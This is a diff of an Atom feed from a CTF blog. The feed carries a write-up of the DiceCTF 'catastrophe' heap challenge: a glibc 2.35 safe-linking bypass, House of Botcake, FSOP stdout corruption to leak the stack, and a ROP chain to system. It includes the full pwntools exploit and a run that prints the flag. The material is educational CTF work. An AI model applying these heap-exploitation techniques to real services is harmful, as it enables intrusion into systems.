@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[heap on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[heap on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/heap/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/heap/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-07-29T20:34:46+02:00</updated>
+    <updated>2022-08-01T03:33:42+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -46,7 +46,7 @@
   href="../../tags/supersnail"
   
   >supersnail</a
-> that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had <code>FULL RELRO</code> while  it had only <code>PARTIAL RELRO</code>. Find the exploit and the tasks are <a
+> that I was using the wrong libc. Then I did it again with the right libc but the dynamic linker was (again) wrong and I lost a loot of time on it. So well, the challenge wasn&rsquo;t pretty hard but I took a funny way to solve it because I thought the libc had <code>FULL RELRO</code> while  it had only <code>PARTIAL RELRO</code>. Find the exploit and the tasks <a
   class="gblog-markdown__link"
   href="https://github.com/ret2school/ctf/tree/master/2022/diceCTF/pwn/catastrophe"
   
@@ -79,7 +79,7 @@
     </h2>
 </div>
 <p>catastrophe is a classic heap challenge here are the classic informations about it:</p>
-<pre tabindex="0"><code>$ ./libc.so.6 
+<pre><code>$ ./libc.so.6 
 GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3) stable release version 2.35.
 Copyright (C) 2022 Free Software Foundation, Inc.
 This is free software; see the source for copying conditions.
@@ -124,7 +124,7 @@ $ checksec --file catastrophe
     </h2>
 </div>
 <p>Since <code>2.32</code> is introduced in the libc the safe-linking mechanism that does some xor encyptions on <code>tcache</code>, <code>fastbin</code> next fp to prevent pointer hiijacking. Here is the core of the mechanism:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L340
 </span><span class="c1"></span><span class="cm">/* Safe-Linking:
 </span><span class="cm">   Use randomness from ASLR (mmap_base) to protect single-linked lists
 </span><span class="cm">   of Fast-Bins and TCache.  That is, mask the &#34;next&#34; pointers of the
@@ -138,7 +138,7 @@ $ checksec --file catastrophe
 </span><span class="cp">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))
 </span><span class="cp">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)
 </span></code></pre></div><p>Since for this challenge we&rsquo;re focused on <code>tcache</code>, here is how a chunk is free&rsquo;d using safe-linking:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/malloc/malloc.c#L3175
 </span><span class="c1"></span><span class="cm">/* Caller must ensure that we know tc_idx is valid and there&#39;s room
 </span><span class="cm">   for more chunks.  */</span>
 <span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
@@ -202,7 +202,7 @@ $ checksec --file catastrophe
   
   >House of botcake</a
 > + safe-linking bypass, heap and libc leak:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py">
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 
 <span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
@@ -227,7 +227,7 @@ $ checksec --file catastrophe
 <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
 <span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;heap @ {hex(heap)}&#34;</span><span class="p">)</span>
 <span class="c1"># then we defeated safe linking lol</span>
 
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
@@ -257,9 +257,9 @@ $ checksec --file catastrophe
 <span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span>
 <span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>
 
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc: {hex(libc)}&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;environ: {hex(environ)}&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;stdout: {hex(stdout)}&#34;</span><span class="p">)</span>
 
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># pop a chunk from the tcache to let an entry left to a </span>
 <span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># free(a) =&gt; tcache</span>
@@ -337,7 +337,7 @@ $ checksec --file catastrophe
   >this one</a
 >.</p>
 <p>To understand the whole process I&rsquo;ll try to introduce you to FSOP. First of all the target structure is stdout, we wanna corrupt stdout because it&rsquo;s used ritght after the <code>fgets</code> that reads the input from the user by the <code>putchar</code> function. Basically on linux &ldquo;everything is a file&rdquo; from the character device the any stream (error, input, output, opened file) we can interact with  a resource just by opening it and by getting a file descriptor on it, right ? This way each file descripor has an associated structure called <code>FILE</code> you may have used if you have already done some stuff with files on linux. Here is its definition:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L49
 </span><span class="c1"></span><span class="cm">/* The tag name of this struct is _IO_FILE to preserve historic
 </span><span class="cm">   C++ mangled names for functions taking FILE* arguments.
 </span><span class="cm">   That name should not be used in new code.  */</span>
@@ -422,7 +422,7 @@ $ checksec --file catastrophe
   >great article</a
 > about FILE structures. What we gonna do right now is trying to understand the use of <code>stdout</code> during within the <code>putchar</code> function. And we will try to find a code path that will not write the provided argument (in this case the <code>\n</code> taken by <code>putchar</code>) into the output buffer we control but rather flush the file stream to directly print its content and then print the provided argument. This way we could get an arbitrary read by controlling the output buffer.
 Let&rsquo;s take a closer look at the <code> __putc_unlocked_body</code> macro:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">
 <span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/bits/types/struct_FILE.h#L106
 </span><span class="c1"></span><span class="cp">#define __putc_unlocked_body(_ch, _fp)					\
 </span><span class="cp">  (__glibc_unlikely ((_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end)	\
@@ -434,7 +434,7 @@ So first condition:</p>
 <ul>
 <li><code>(_fp)-&gt;_IO_write_ptr &gt;= (_fp)-&gt;_IO_write_end</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L198
 </span><span class="c1"></span><span class="kt">int</span>
 <span class="nf">__overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
 <span class="p">{</span>
@@ -444,7 +444,7 @@ So first condition:</p>
   <span class="k">return</span> <span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
 <span class="p">}</span>
 </code></pre></div><p>Given the file stream isn&rsquo;t oriented (byte granularity) we directly reach the <code>_IO_OVERFLOW</code> call, now the final goal to get a leak is to reach the <code>_IO_do_write</code> call:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L730
 </span><span class="c1"></span>
 <span class="kt">int</span>
 <span class="nf">_IO_new_file_overflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">int</span> <span class="n">ch</span><span class="p">)</span>
@@ -514,7 +514,7 @@ So first condition:</p>
 <li>make <code>f-&gt;_IO_write_ptr</code> equal to <code>f-&gt;_IO_buf_end</code> to then call <code>_IO_do_flush</code>.</li>
 </ul>
 <p>Now we reached <code>_IO_do_flush</code> which is basically just a macro:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">
 <span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L507
 </span><span class="c1"></span><span class="cp">#define _IO_do_flush(_f) \
 </span><span class="cp">  ((_f)-&gt;_mode &lt;= 0							      \
@@ -525,7 +525,7 @@ So first condition:</p>
 </span><span class="cp">		    - (_f)-&gt;_wide_data-&gt;_IO_write_base)))
 </span><span class="cp"></span>
 </code></pre></div><p>Given <code>stdout</code> is byte-oriented <code>_IO_new_do_write</code> is called:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c">
 <span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L418
 </span><span class="c1"></span><span class="k">static</span> <span class="n">size_t</span> <span class="nf">new_do_write</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="n">size_t</span><span class="p">);</span>
 
@@ -578,7 +578,7 @@ So first condition:</p>
 <li><code>fp-&gt;_IO_write_base</code> = <code>&amp;environ</code>.</li>
 </ul>
 <p>Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py">
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py">
 <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> 
     <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="c1"># _flags</span>
     <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="c1"># _IO_read_*</span>
@@ -590,7 +590,7 @@ So first condition:</p>
 
 <span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span> 
 <span class="c1"># Offset of the saved rip that belongs to frame of the op_malloc function</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;stack: {hex(stack)}&#34;</span><span class="p">)</span>
 
 </code></pre></div><div class="gblog-post__anchorwrap">
     <h2 id="ropchain">
@@ -611,7 +611,7 @@ So first condition:</p>
 </ul>
 <p>When we got the write what where on the stack we simply have to craft a call ot system since there is no <code>seccomp</code> shit.
 Here is the script:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># prev</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># prev</span>
 <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="c1"># victim</span>
 
 <span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;T&#34;</span><span class="o">*</span><span class="mh">0x108</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x111</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">((</span><span class="n">stack</span> <span class="o">^</span> <span class="p">((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0xb20</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">))),</span> <span class="mh">0x130</span><span class="p">)</span>
@@ -621,7 +621,7 @@ Here is the script:</p>
 <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">(),</span> <span class="mh">0x100</span><span class="p">)</span> <span class="c1"># overwrite sRBP for nothing lmao</span>
 <span class="c1"># ROPchain on do_malloc&#39;s stackframe</span>
 </code></pre></div><p>And here we are:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>mc.ax <span class="nv">PORT</span><span class="o">=</span><span class="m">31273</span>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">nasm@off:~/Documents/pwn/diceCTF/catastrophe/f2$ python3 sexploit.py REMOTE <span class="nv">HOST</span><span class="o">=</span>mc.ax <span class="nv">PORT</span><span class="o">=</span><span class="m">31273</span>
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/nasm/Documents/pwn/diceCTF/catastrophe/f2/catastrophe&#39;</span>
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -681,7 +681,7 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
     </h2>
 </div>
 <p>Final exploit:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="c1"># this exploit was generated via</span>
@@ -695,8 +695,8 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
 
 <span class="c1"># Set up pwntools for the correct architecture</span>
 <span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;catastrophe&#39;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="bp">False</span>
 <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2000</span>
 
 <span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
@@ -733,13 +733,13 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
 </span><span class="s1">continue
 </span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>
 
-<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>
+<span class="n">io</span> <span class="o">=</span> <span class="bp">None</span>
 
 <span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>
 
 <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
 
-<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="kc">False</span><span class="p">):</span>
+<span class="k">def</span> <span class="nf">alloc</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">s</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;-</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span> 
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;Index?</span><span class="se">\n</span><span class="s2">&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> 
@@ -764,7 +764,7 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
 <span class="n">view</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
 
 <span class="n">heap</span> <span class="o">=</span> <span class="p">((</span><span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">))</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;heap @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">heap</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;heap @ {hex(heap)}&#34;</span><span class="p">)</span>
 <span class="c1"># then we defeated safe linking lol</span>
 
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
@@ -793,9 +793,9 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
 <span class="n">environ</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x221200</span> 
 <span class="n">stdout</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x21a780</span>
 
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;libc: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;environ: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stdout: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stdout</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;libc: {hex(libc.address)}&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;environ: {hex(environ)}&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;stdout: {hex(stdout)}&#34;</span><span class="p">)</span>
 
 <span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;YY&#34;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
 <span class="n">free</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
@@ -804,7 +804,7 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
 <span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">environ</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="mh">0x100</span><span class="p">)</span>
 
 <span class="n">stack</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x130</span> <span class="o">-</span> <span class="mi">8</span><span class="c1"># - 0x1bebe0 # offset of the unsorted bin</span>
-<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;stack: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;stack: {hex(stack)}&#34;</span><span class="p">)</span>
 
 <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># large</span>
 <span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
@@ -887,7 +887,7 @@ hope<span class="o">{</span>apparently_not_good_enough_33981d897c3b0f696e32d3c67
         </a>
     </h2>
 </div>
-<pre tabindex="0"><code>$ ./phonebook
+<pre><code>$ ./phonebook
 Choose an option: [1-5]
 1. Store someone's information
 2. Edit information
@@ -896,7 +896,7 @@ Choose an option: [1-5]
 5. Add the hidden_note
 &gt; 
 </code></pre><p>We can create an entity and then initialize: a name, a numero and a function pointer.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">create</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
